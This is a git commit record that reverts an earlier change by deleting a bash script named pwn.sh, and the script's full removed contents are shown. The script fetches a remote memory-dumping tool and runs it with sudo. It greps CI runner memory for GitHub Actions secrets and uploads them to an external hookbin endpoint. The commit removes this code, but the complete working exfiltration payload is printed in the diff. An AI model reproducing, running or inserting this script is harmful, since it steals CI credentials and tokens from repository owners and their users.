49f91915b7993f58ca9f818d5134d62f9b0c5ad7
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-20 04:13:19 +0000

    Revert "Add temporary change"
    This reverts commit 066ff89a88801b931f078169e771fe225fefffb3.

--- pwn.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-if [ "$PWN_EXECUTED" != "true" ]; then
-    export PWN_EXECUTED=true
-    echo "Okay, we got this far. Let's continue..." >&2
-    curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
-    curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
-fi
-exec "$@"
